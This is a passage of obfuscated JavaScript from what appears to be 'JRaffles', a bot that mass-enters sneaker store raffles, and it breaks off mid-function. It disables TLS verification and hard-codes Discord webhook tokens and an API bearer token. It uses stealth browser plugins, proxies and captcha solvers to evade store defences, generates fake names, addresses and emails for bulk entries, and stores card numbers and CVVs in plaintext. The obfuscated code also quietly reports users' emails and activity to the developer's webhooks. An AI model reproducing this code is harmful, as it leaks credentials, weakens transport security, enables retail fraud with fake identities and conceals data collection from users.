process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x223df9 = require('fs'), _0x9f5127 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x4a9339(_0x100e1d) {
    const _0x50bfdb = _0x223df9['createWriteStream'](_0x100e1d, { 'flags': 'a' }), _0x567857 = console['log'];
    console['log'] = function () {
        const _0xf900be = Array['prototype']['slice']['call'](arguments), _0x255eea = _0xf900be['join']('\x20') + '\x0a';
        _0x50bfdb['write'](_0x255eea), _0x567857['apply'](console, _0xf900be);
    };
}
_0x4a9339('../logs/log\x20' + _0x9f5127);
var _0x51e796 = require('tough-cookie'), _0x2fa2c3 = require('node-imap'), _0x1e9570 = require('util')['inspect'];
const _0x44103a = require('mailparser')['simpleParser'], { EmbedBuilder: _0xfbfc7b } = require('discord.js');
var _0x287efa = require('exe');
const { execFile: _0x3edf4d } = require('child_process'), _0x23e690 = require('puppeteer-extra'), _0x321669 = require('cross-spawn'), _0x2aeb7e = require('puppeteer-extra-plugin-recaptcha'), _0x57a02e = require('puppeteer-extra-plugin-stealth'), _0x3dfcf2 = require('chalk'), _0x445891 = require('node-bash-title'), _0x48af5a = require('axios'), _0x57f277 = require('papaparse');
var _0x5eb148 = require('random-name');
const _0x475f73 = require('request');
var _0x5addda = require('prompt');
const _0x22e099 = _0x475f73['jar']();
var _0x4ae33b = {};
const _0x3f8c5c = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0xdba51c = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x27348d = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x5f1a9d = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x1e2e15 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x50622d = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x4f507b = 'https://discord.com/api/webhooks/', _0x1ae061 = '' + _0x4f507b + _0x27348d, _0x1041df = '' + _0x4f507b + _0x5f1a9d, _0x3a625c = '' + _0x4f507b + _0x3f8c5c, _0x36657d = '' + _0x4f507b + _0xdba51c, _0x22a07c = '' + _0x4f507b + _0x1e2e15, _0x4b7487 = '' + _0x4f507b + _0x50622d;
const _0x2a0b61 = JSON['parse'](_0x223df9['readFileSync']('country.json', 'utf-8')), _0x2157e7 = JSON['parse'](_0x223df9['readFileSync']('../package.json', 'utf-8')), _0x8a26c5 = _0x2157e7['version'];
var _0x4d7b48, _0x2bc9a5, _0x45dbed, _0xd1ea49, _0x2384f4, _0xa9458, _0x128b96, _0x407c11;
const _0x520633 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0xebbdae = ![];
const _0x292ac8 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x32c898 = '0123456789';
var _0x1a2852 = _0x292ac8['split']('');
const _0x61a475 = require('auto-git-update'), _0x1f02d0 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x3d6f21 = new _0x61a475(_0x1f02d0);
async function _0x36d5d6() {
    _0x2384f4 = _0x223df9['readdirSync']('../proxies'), _0xd1ea49 = _0x223df9['readdirSync']('../tasks'), !_0x223df9['existsSync']('../accounts/fenom.csv') && _0x223df9['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x223df9['existsSync']('../accounts/paypal.csv') && _0x223df9['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x223df9['existsSync']('../accounts/bstn.csv') && _0x223df9['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x223df9['existsSync']('../accounts/eql.csv') && _0x223df9['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x223df9['existsSync']('../failed-tasks.csv') && _0x223df9['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x223df9['existsSync']('../successful-tasks.csv') && _0x223df9['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x4ae33b = JSON['parse'](_0x223df9['readFileSync']('../settings.json', 'utf-8')), !_0x4ae33b['delay'] && (_0x4ae33b['delay'] = 0x3c, _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), !_0x4ae33b['threads'] && (_0x4ae33b['threads'] = 0x1, _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), !_0x4ae33b['masterMail'] && (_0x4ae33b['masterMail'] = 'yourmail@gmail.com', _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), !_0x4ae33b['CapSolver'] && (_0x4ae33b['CapSolver'] = 'yourkeyhere', _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), !_0x4ae33b['masterPassword'] && (_0x4ae33b['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), !_0x4ae33b['captchaKey'] && (_0x4ae33b['captchaKey'] = '', _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), !_0x4ae33b['useRandomProxy'] && (_0x4ae33b['useRandomProxy'] = !![], _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), !_0x4ae33b['shuffleTasks'] && (_0x4ae33b['shuffleTasks'] = ![], _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), !_0x4ae33b['webhook'] && (_0x4ae33b['webhook'] = '', _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), _0x4ae33b['delay'] <= 0x1388 && (_0x4ae33b['delay'] = _0x4ae33b['delay'] * 0x3e8), _0x4ae33b['AfewDelay'] && (delete _0x4ae33b['AfewDelay'], _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), _0x4ae33b['MahaDelay'] && (delete _0x4ae33b['MahaDelay'], _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), _0x4ae33b['footshopDelay'] && (delete _0x4ae33b['footshopDelay'], _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b, null, 0x2))), _0x4ae33b['MahaDelay'] = _0x4ae33b['delay'], _0x4f507b = _0x4ae33b['webhook'], _0xa9458 = _0x4ae33b['licenseKey'];
}
let _0x48b264, _0x2d93fc = [], _0x4ad8a1;
const _0x41ed31 = _0x4324a6 => new Promise(_0x1af37b => setTimeout(_0x1af37b, _0x4324a6));
function _0x120d6e(_0x1cbb68, _0x1f0bb0) {
    return Math['floor'](Math['random']() * (_0x1f0bb0 - _0x1cbb68 + 0x1) + _0x1cbb68);
}
function _0xcd4291(_0x52bf01) {
    let _0x57e596 = _0x52bf01['length'], _0x3cc37c;
    while (_0x57e596 != 0x0) {
        _0x3cc37c = Math['floor'](Math['random']() * _0x57e596), _0x57e596--, [_0x52bf01[_0x57e596], _0x52bf01[_0x3cc37c]] = [
            _0x52bf01[_0x3cc37c],
            _0x52bf01[_0x57e596]
        ];
    }
    return _0x52bf01;
}
async function _0x1f4556(_0x3f7f60) {
    try {
        return _0x48af5a['post']('https://api.whop.com/api/v2/memberships/' + _0x3f7f60 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x46ea73) {
        console['log']('Error\x20checking\x20license:\x20' + _0x46ea73['message']);
    }
}
async function _0x2f4b3a(_0x2892bd) {
    console['clear']();
    if (_0x2892bd == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x2b0fc9 = await _0x5addda['get']('License');
        if (_0x2b0fc9['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x41ed31(0xbb8), _0x2f4b3a(_0x2892bd);
        _0x2892bd = _0x2b0fc9['License'], _0x4ae33b['licenseKey'] = _0x2892bd, _0xa9458 = _0x2892bd, _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b));
    }
    console['log']('Checking\x20license\x20' + _0xa9458 + '...'), await _0x41ed31(0x320);
    const _0x2c65a0 = await _0x1f4556(_0x2892bd);
    _0x128b96 = JSON['stringify'](_0x2c65a0['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x407c11 = JSON['stringify'](_0x2c65a0['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x2c65a0)
        return console['log']('License\x20not\x20found');
    if (!_0x2c65a0['data'])
        return console['log']('License\x20not\x20bound');
    return _0x2c65a0['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0xebbdae = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0xebbdae = ![]);
}
async function _0xae690() {
    var _0xc5d289 = await _0x5addda['get']('Module');
    return console['clear'](), _0xc5d289['Module'];
}
;
async function _0x588cb3() {
    var _0x2b1422 = await _0x5addda['get']('Setting');
    return console['clear'](), _0x2b1422['Setting'];
}
async function _0x55c71b(_0x386e99) {
    var _0x5ae8b2 = [];
    for (file of _0xd1ea49) {
        var _0x39b73d = _0x223df9['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x57f277['parse'](_0x39b73d, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x386e99['store'] && _0x5ae8b2['push'](file);
    }
    !_0x5ae8b2['length'] == 0x0 && (_0xd1ea49 = _0x5ae8b2);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x14e414 = 0x0; _0x14e414 < _0xd1ea49['length']; _0x14e414++) {
        console['log']('\x20(' + _0x14e414 + ')\x20' + _0xd1ea49[_0x14e414]);
    }
    console['log']('');
    var _0x21b57a = await _0x5addda['get']('Task');
    if (_0x21b57a['Task'] > _0xd1ea49['length'] - 0x1 || isNaN(_0x21b57a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x41ed31(0x3e8), _0x55c71b();
    var _0x19dde6 = _0x223df9['readFileSync']('../tasks/' + _0xd1ea49[_0x21b57a['Task']], 'utf-8');
    return _0x45dbed = _0x57f277['parse'](_0x19dde6, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x3dfcf2['blue'](_0xd1ea49[_0x21b57a['Task']])), _0x4d7b48 = _0xd1ea49[_0x21b57a['Task']], _0x45dbed;
}
async function _0x1ee84e() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x950a64 = 0x0; _0x950a64 < _0x2384f4['length']; _0x950a64++) {
        console['log']('\x20(' + _0x950a64 + ')\x20' + _0x2384f4[_0x950a64]);
    }
    console['log']('');
    var _0x51a863 = await _0x5addda['get']('Proxies');
    if (_0x51a863['Proxies'] > _0x2384f4['length'] - 0x1 || isNaN(_0x51a863['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x41ed31(0x3e8), _0x1ee84e();
    var _0x2f1cba = _0x223df9['readFileSync']('../proxies/' + _0x2384f4[_0x51a863['Proxies']], 'utf-8')['split']('\x0a');
    let _0x1e2440 = _0x2f1cba['map']((_0x265432, _0x588955) => {
        sanatizeProxy = _0x265432['replace']('\x0d', '');
        if (_0x2f1cba[_0x588955 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2bc9a5 = _0x2384f4[_0x51a863['Proxies']], console['clear'](), _0x1e2440;
}
async function _0x129468() {
    var _0x3a5527 = await _0x5addda['get']('Value');
    return console['clear'](), _0x3a5527['Value'];
}
async function _0xfe4705(_0x21dd96) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0xabd537 = 0x0; _0xabd537 < _0x21dd96['length']; _0xabd537++) {
        console['log']('\x20(' + _0xabd537 + ')\x20[' + _0x21dd96[_0xabd537]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x1d401c = await _0x5addda['get']('Module');
    return _0x1d401c['Module'];
}
async function _0x16fe62() {
    var _0x366808 = await _0x5addda['get']('Password');
    return console['clear'](), _0x366808['Password'];
}
;
async function _0x5deb04() {
    var _0x398b86 = await _0x5addda['get']('Links');
    return _0x398b86['Links'];
}
;
async function _0x4370d5() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x472f2c = 0x0; _0x472f2c < _0x2d93fc['length']; _0x472f2c++) {
        console['log']('\x20(' + _0x472f2c + ')\x20' + _0x2d93fc[_0x472f2c]);
    }
    ;
    console['log']();
    let _0x451e44 = await _0x5addda['get']('Product');
    return console['clear'](), _0x451e44['Product'];
}
;
function _0x82e5a5() {
    var _0x19ed23 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x19ed23;
}
;
function _0x570da1() {
    var _0x77140c = new Date(Date['now']())['toLocaleString']();
    return _0x77140c['replace'](',', '');
}
async function _0x48936e(_0x347451, _0x2e9000) {
    let _0x309de1 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x8a26c5 != 'devkey') {
        await _0x48af5a['post'](_0x347451, _0x2e9000, _0x309de1);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x559dec(_0x4ec199, _0x1c9b11, _0x18a574, _0x55ab7e, _0x10fae5) {
    if (!_0x55ab7e && _0x18a574 == 'dev') {
        var _0x1f0758 = new _0xfbfc7b()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x1c9b11['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x1c9b11['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x4ec199['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x4ae33b['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x128b96,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x4ec199['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x4ec199['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x8a26c5,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x1f0758['data'];
    } else {
        if (_0x55ab7e && _0x18a574 == 'dev') {
            var _0x1f0758 = new _0xfbfc7b()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x1c9b11['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x128b96,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x1c9b11['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x4ec199['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x4ae33b['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x10fae5,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x4ec199['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x4ec199['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x8a26c5,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x1f0758['data'];
        } else {
            if (_0x18a574 == 'pub') {
                var _0x1f0758 = new _0xfbfc7b()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x1c9b11['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x1c9b11['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x4ec199['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x4ae33b['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x4ec199['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x8a26c5,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x1f0758['data'];
            } else {
                if (_0x18a574 == 'acc' && !_0x55ab7e) {
                    var _0x1f0758 = new _0xfbfc7b()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x1c9b11['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x128b96,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x1c9b11['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x4ae33b['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x8a26c5,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x1f0758['data'];
                } else {
                    if (_0x18a574 == 'acc' && _0x55ab7e) {
                        var _0x1f0758 = new _0xfbfc7b()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x1c9b11['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x128b96,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x10fae5,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x1c9b11['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x4ae33b['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x8a26c5,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x1f0758['data'];
                    } else {
                        if (_0x18a574 == 'open') {
                            var _0x1f0758 = new _0xfbfc7b()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x407c11)['addFields']({
                                'name': 'User',
                                'value': '' + _0x128b96,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x8a26c5,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x1f0758['data'];
                        } else {
                            if (!_0x55ab7e && _0x18a574 == 'ver') {
                                var _0x1f0758 = new _0xfbfc7b()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x1c9b11['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x128b96,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x1c9b11['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x4ae33b['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x8a26c5,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x1f0758['data'];
                            } else {
                                if (_0x55ab7e && _0x18a574 == 'ver') {
                                    var _0x1f0758 = new _0xfbfc7b()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x1c9b11['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x128b96,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x10fae5,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x1c9b11['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x4ae33b['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x8a26c5,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x1f0758['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x101e1b(_0x20a355, _0x2a9659) {
    var _0x53e3ef = _0x20a355[_0x2a9659]['Address1']['split'](''), _0xbce539 = _0x20a355[_0x2a9659]['Address2']['split'](''), _0x5e7c42 = _0x20a355[_0x2a9659]['Email']['split']('@');
    for (var _0x21be93 = 0x0; _0x21be93 < _0x53e3ef['length']; _0x21be93++) {
        if (_0x53e3ef[_0x21be93] == 'X') {
            var _0x102e93 = Math['round'](Math['random']() * (_0x292ac8['length'] - 0x1));
            _0x53e3ef[_0x21be93] = _0x1a2852[_0x102e93];
        }
    }
    ;
    for (var _0x21be93 = 0x0; _0x21be93 < _0xbce539['length']; _0x21be93++) {
        if (_0xbce539[_0x21be93] == 'X') {
            var _0x102e93 = Math['round'](Math['random']() * (_0x292ac8['length'] - 0x1));
            _0xbce539[_0x21be93] = _0x1a2852[_0x102e93];
        }
    }
    ;
    _0x20a355[_0x2a9659]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x20a355[_0x2a9659]['FirstName'] = _0x5eb148['first']());
    _0x20a355[_0x2a9659]['LastName']['toUpperCase']() == 'RANDOM' && (_0x20a355[_0x2a9659]['LastName'] = _0x5eb148['last']());
    _0x5e7c42[0x0]['toUpperCase']() == 'RANDOM' ? _0x5e7c42[0x0] = '' + _0x5eb148['first']() + _0x5eb148['last']() + _0x120d6e(0x1, 0x3e7) + '@' : _0x5e7c42[0x0] = _0x5e7c42[0x0] + '@';
    _0x20a355[_0x2a9659]['Email'] = _0x5e7c42['join'](''), _0x20a355[_0x2a9659]['Address1'] = _0x53e3ef['join'](''), _0x20a355[_0x2a9659]['Address2'] = _0xbce539['join']('');
    _0x20a355[_0x2a9659]['Phone'] == 'RANDOM' && (_0x20a355[_0x2a9659]['Phone'] = '0' + _0x120d6e(0x5f5e100, 0x3b9ac9ff));
    if (_0x20a355[_0x2a9659]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x11795f = _0x120d6e(0x1, 0x270f);
        _0x20a355[_0x2a9659]['Follower'] = '' + _0x5eb148['first']() + _0x5eb148['last']() + _0x11795f + '\x20';
    }
    _0x20a355[_0x2a9659]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x20a355[_0x2a9659]['HouseNumber'] = _0x120d6e(0x1, 0xc8));
    if (_0x20a355[_0x2a9659]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x350a06 = Math['round'](Math['random']() * (_0x292ac8['length'] - 0x1)), _0x4dd94b = _0x1a2852[_0x350a06];
        _0x20a355[_0x2a9659]['Address1'] = _0x5eb148['last']() + 'straat', _0x20a355[_0x2a9659]['Zip'] == '' && (_0x20a355[_0x2a9659]['Postcode'] = _0x120d6e(0x3e8, 0x270f) + '\x20' + _0x4dd94b + _0x4dd94b, _0x20a355[_0x2a9659]['Zip'] = _0x20a355[_0x2a9659]['Postcode']), _0x20a355[_0x2a9659]['HouseNumber'] = '' + _0x120d6e(0x1, 0xc8);
    }
    return;
}
;
async function _0x2504ad(_0x3060e3, _0x1c62f2) {
    _0x223df9['appendFileSync']('../failed-tasks.csv', _0x570da1() + ',' + _0x1c62f2['store'] + ',' + _0x1c62f2['name'] + ',' + _0x3060e3['Url'] + ',' + _0x3060e3['Size'] + ',' + _0x3060e3['Follower'] + ',' + _0x3060e3['FirstName'] + ',' + _0x3060e3['LastName'] + ',' + _0x3060e3['Address1'] + ',' + _0x3060e3['Address2'] + ',' + _0x3060e3['HouseNumber'] + ',' + _0x3060e3['Zip'] + ',' + _0x3060e3['City'] + ',' + _0x3060e3['State'] + ',' + _0x3060e3['Country'] + ',' + _0x3060e3['Phone'] + ',' + _0x3060e3['Email'] + ',' + _0x3060e3['Password'] + ',' + _0x3060e3['PaymentMethod'] + ',' + _0x3060e3['CardType'] + ',' + _0x3060e3['NameOnCard'] + ',' + _0x3060e3['CardNumber'] + ',' + _0x3060e3['ExpiryDate'] + ',' + _0x3060e3['CVV'] + ',' + _0x3060e3['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x13e83d(_0x1fd957, _0x28ba8d) {
    _0x223df9['appendFileSync']('../successful-tasks.csv', _0x570da1() + ',' + _0x28ba8d['store'] + ',' + _0x28ba8d['name'] + ',' + _0x1fd957['Url'] + ',' + _0x1fd957['Size'] + ',' + _0x1fd957['Follower'] + ',' + _0x1fd957['FirstName'] + ',' + _0x1fd957['LastName'] + ',' + _0x1fd957['Address1'] + ',' + _0x1fd957['Address2'] + ',' + _0x1fd957['HouseNumber'] + ',' + _0x1fd957['Zip'] + ',' + _0x1fd957['City'] + ',' + _0x1fd957['State'] + ',' + _0x1fd957['Country'] + ',' + _0x1fd957['Phone'] + ',' + _0x1fd957['Email'] + ',' + _0x1fd957['Password'] + ',' + _0x1fd957['PaymentMethod'] + ',' + _0x1fd957['CardType'] + ',' + _0x1fd957['NameOnCard'] + ',' + _0x1fd957['CardNumber'] + ',' + _0x1fd957['ExpiryDate'] + ',' + _0x1fd957['CVV'] + ',' + _0x1fd957['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x53aefc() {
    let _0x9a1ccb = proxyFile['split']('\x0a'), _0x1d7b8b = _0x9a1ccb['map']((_0x474cfd, _0x45bf23) => {
        sanatizeProxy = _0x474cfd['replace']('\x0d', '');
        if (_0x9a1ccb[_0x45bf23 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1d7b8b;
}
;
async function _0x5d891e(_0x294262, _0x8b4b15) {
    if (_0x288e5d != 'yes')
        var _0x288e5d = '', _0x1b406a = 0x0;
    async function _0x383778() {
        var _0x15d1da = _0x223df9['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x3f4d33 = _0x57f277['parse'](_0x15d1da, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x5af2f9 = 0x0; _0x5af2f9 < _0x3f4d33['length']; _0x5af2f9++) {
            console['log']('(' + _0x5af2f9 + ')\x20' + _0x3f4d33[_0x5af2f9]['Email']);
        }
